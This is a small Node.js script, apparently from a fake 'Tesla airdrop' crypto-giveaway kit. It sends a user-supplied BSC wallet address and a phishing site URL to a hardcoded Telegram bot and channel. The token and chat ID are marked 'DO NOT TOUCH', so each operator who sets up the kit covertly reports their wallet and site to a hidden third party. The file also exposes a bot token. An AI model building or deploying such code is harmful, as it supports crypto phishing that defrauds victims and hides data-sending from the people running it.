const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7052759807:AAEuOXrrhrCSGHVZu1dNZBSIMoIVXmZ_HDM';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '6687721863';


async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
    try {
        const message = `BSC Wallet Receiver ID: ${bsc_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const bsc_wallet_receiver_id = '0x1Bd9e6fC649C1Ff7e532Cfe8928b748933cB5E5A';
const website_url = 'tesla-airdropclaim-giveaway.vercel.app';
sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
